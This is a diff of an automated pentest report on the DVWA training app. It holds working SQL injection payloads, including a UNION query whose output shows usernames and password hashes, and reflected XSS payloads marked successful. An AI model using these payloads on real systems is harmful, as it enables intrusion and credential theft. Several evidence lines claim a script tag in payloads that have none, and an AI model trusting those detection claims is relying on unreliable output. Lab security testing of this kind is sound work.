@@ -1,13 +1,13 @@
 # Automated Web Pentest Report
 
-**Scan Date:** 2025-06-12T08:35:19.667288Z  
-**Target:** DVWA
+**Scan Date:** 2025-06-18T04:39:43.716188Z  
+**Target:** DVWA (All modules)
 
 ## Test Environment
 
 - **Server OS:** Kali GNU/Linux Rolling
 - **Python Version:** 3.13.3
-- **Scan Date:** 2025-06-12 08:35:19 UTC
+- **Scan Date:** 2025-06-18 04:39:43 UTC
 - **SQLmap Version:** 1.9.4#stable
 - **Target App:** DVWA (Damn Vulnerable Web Application)
 - **Version:** 1.10 *Development*
@@ -27,13 +27,14 @@
 
 ---
 ## Executive Summary
-- Total vulnerabilities tested: 4  
-- Successful exploits: 3  
+- Total vulnerabilities tested: 14  
+- Successful exploits: 13  
 - Risk Level: **Critical**
 
 
 ---
-## Test Cases Table
+
+## SQL Injection Test Cases
 
 | # | Payload | Status | Severity |
 |---|---------|--------|----------|
@@ -43,10 +44,10 @@
 | 4 | `addadasddad` | Fail | Low |
 
 ---
-## Evidence Details
+### SQL Injection Evidence Details
 
 **Severity:** `Critical`
-### [1] Payload: `' OR '1'='1`
+#### Payload: `' OR '1'='1`
 ```
 ID: ' OR '1'='1
 First name: admin
@@ -69,9 +70,8 @@ First name: Bob
 Surname: Smith
 ```
 
----
 **Severity:** `Critical`
-### [2] Payload: `' OR 1=1 #`
+#### Payload: `' OR 1=1 #`
 ```
 ID: ' OR 1=1 #
 First name: admin
@@ -94,9 +94,8 @@ First name: Bob
 Surname: Smith
 ```
 
----
 **Severity:** `Critical`
-### [3] Payload: `' union select user, password from users#`
+#### Payload: `' union select user, password from users#`
 ```
 ID: ' union select user, password from users#
 First name: admin
@@ -119,11 +118,112 @@ First name: smithy
 Surname: 5f4dcc3b5aa765d61d8327deb882cf99
 ```
 
----
 **Severity:** `Low`
-### [4] Payload: `addadasddad`
+#### Payload: `addadasddad`
 ```
 User ID:
+```
+
+---
+
+## XSS Test Cases
+
+| # | Payload | Status | Severity |
+|---|---------|--------|----------|
+| 1 | `<script>alert('XSS')</script>` | Success | High |
+| 2 | `"><img src=x onerror=alert(1)>` | Success | High |
+| 3 | `<svg/onload=alert(1)>` | Success | High |
+| 4 | `<body onload=alert('xss')>` | Success | High |
+| 5 | `"><svg onload=alert('xss')>` | Success | High |
+| 6 | `<script>alert('XSS')</script>` | Success | High |
+| 7 | `"><img src=x onerror=alert(1)>` | Success | High |
+| 8 | `<svg/onload=alert(1)>` | Success | High |
+| 9 | `<body onload=alert('xss')>` | Success | High |
+| 10 | `"><svg onload=alert('xss')>` | Success | High |
+
+---
+### XSS Evidence Details
+
+**Severity:** `High`
+#### Payload: `<script>alert('XSS')</script>`
+```
+Payload reflected: <script>alert('XSS')</script>
+
+Detected <script> tag in response.
+
+Detected alert() in response.
+```
+
+**Severity:** `High`
+#### Payload: `"><img src=x onerror=alert(1)>`
+```
+Payload reflected: "><img src=x onerror=alert(1)>
+
+Detected <script> tag in response.
+
+Detected alert() in response.
+
+Detected image/event XSS payload.
+```
+
+**Severity:** `High`
+#### Payload: `<svg/onload=alert(1)>`
+```
+Payload reflected: <svg/onload=alert(1)>
+
+Detected <script> tag in response.
+
+Detected alert() in response.
+```
+
+**Severity:** `High`
+#### Payload: `<body onload=alert('xss')>`
+```
+Payload reflected: <body onload=alert('xss')>
+
+Detected <script> tag in response.
+
+Detected alert() in response.
+```
+
+**Severity:** `High`
+#### Payload: `"><svg onload=alert('xss')>`
+```
+Payload reflected: "><svg onload=alert('xss')>
+
+Detected <script> tag in response.
+
+Detected alert() in response.
+```
+
+**Severity:** `High`
+#### Payload: `<script>alert('XSS')</script>`
+```
+Detected <script> tag in response.
+```
+
+**Severity:** `High`
+#### Payload: `"><img src=x onerror=alert(1)>`
+```
+Detected <script> tag in response.
+```
+
+**Severity:** `High`
+#### Payload: `<svg/onload=alert(1)>`
+```
+Detected <script> tag in response.
+```
+
+**Severity:** `High`
+#### Payload: `<body onload=alert('xss')>`
+```
+Detected <script> tag in response.
+```
+
+**Severity:** `High`
+#### Payload: `"><svg onload=alert('xss')>`
+```
+Detected <script> tag in response.
 ```
 
 ---
